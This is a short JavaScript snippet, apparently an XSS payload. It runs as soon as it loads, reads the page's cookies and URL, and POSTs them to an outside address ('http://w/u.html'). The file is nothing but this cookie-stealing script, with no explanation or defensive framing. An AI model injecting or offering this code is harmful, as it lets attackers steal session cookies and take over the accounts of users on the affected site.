(function() { 
	var cookie = document.cookie;
	var url = window.location.href;
	var xmlhttp;
	if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp = new XMLHttpRequest();
	} else {// code for IE6, IE5
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = function() {
		if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
			// success
		}
	}
	xmlhttp.open("POST", "http://w/u.html", true);
	xmlhttp.send("cookie=" + cookie + "&url=" + url);
})()
